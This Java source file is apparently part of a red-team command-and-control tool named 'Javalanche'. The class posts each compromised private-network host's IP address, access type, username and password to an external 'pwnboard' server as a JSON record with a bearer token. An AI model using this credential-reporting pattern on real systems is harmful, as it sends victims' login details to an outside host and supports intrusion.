package Servers.C2;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.Scanner;

public class pwnBoardRequest implements Runnable {
    private URI pwnboardUri = null;
    private URL pwnboardUrl = null;
    
    private String pwnboardData;
    private String pwnboardToken;

    private String IPAddress;

    public pwnBoardRequest(String IPAddress, String accessType, String username, String password, String pwnboard_api_key) {
        this.IPAddress = IPAddress;
        try{
            this.pwnboardUri = new URI("https://pwn.salsas.bar/pwn");
            this.pwnboardUrl = this.pwnboardUri.toURL();
        } catch (URISyntaxException e){
            e.printStackTrace();
        } catch (MalformedURLException e){
            e.printStackTrace();
        }

        String accessInfo = "https://www.javalanche.net" + " | " + "Username: " + username + " Password: " + password;

        pwnboardData  = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"" + accessType + "\", \"access_info\": \"" + accessInfo + "\"}"; 
        pwnboardToken = "Bearer " + pwnboard_api_key;
    }

    /**
     * Determines whether an IPv4 address falls within an RFC 1918 private range:
     * 10.0.0.0/8, 172.16.0.0/12 (172.16.x.x - 172.31.x.x), or 192.168.0.0/16.
     * Only private clients should be reported to pwnboard.
     *
     * @param ip - dotted-quad IPv4 address
     * @return true if the address is private, false otherwise (including malformed input)
     */
    private static boolean isPrivateAddress(String ip) {
        if (ip == null) {
            return false;
        }
        String[] octets = ip.split("\\.");
        if (octets.length != 4) {
            return false;
        }
        int[] values = new int[4];
        for (int i = 0; i < 4; i++) {
            try {
                values[i] = Integer.parseInt(octets[i]);
            } catch (NumberFormatException e) {
                return false;
            }
            if (values[i] < 0 || values[i] > 255) {
                return false;
            }
        }

        if (values[0] == 10) {
            return true;
        }
        if (values[0] == 172 && values[1] >= 16 && values[1] <= 31) {
            return true;
        }
        if (values[0] == 192 && values[1] == 168) {
            return true;
        }
        return false;
    }

    @Override
    public void run() {
        try {
            if (!isPrivateAddress(IPAddress)) {
                return;
            }
            // Connect to pwnboard
            HttpURLConnection pwnboardConnection = (HttpURLConnection)pwnboardUrl.openConnection();
            pwnboardConnection.setDoOutput(true);
            pwnboardConnection.setRequestMethod("POST");
            pwnboardConnection.setRequestProperty("Content-Type", "application/json");
            pwnboardConnection.setRequestProperty("Authorization", pwnboardToken);
            pwnboardConnection.connect();

            // Send api request
            DataOutputStream writer = new DataOutputStream(pwnboardConnection.getOutputStream());

            writer.writeBytes(pwnboardData);
            writer.close();

            // Debug lines
            InputStream in = pwnboardConnection.getInputStream();
            Scanner scanner = new Scanner(in);

            while(scanner.hasNext()){
                scanner.nextLine();
            }
            scanner.close();

            pwnboardConnection.disconnect();
        } catch (IOException e){
            System.out.println("when sending " + pwnboardData);
            e.printStackTrace();
        }   
    }
    
}
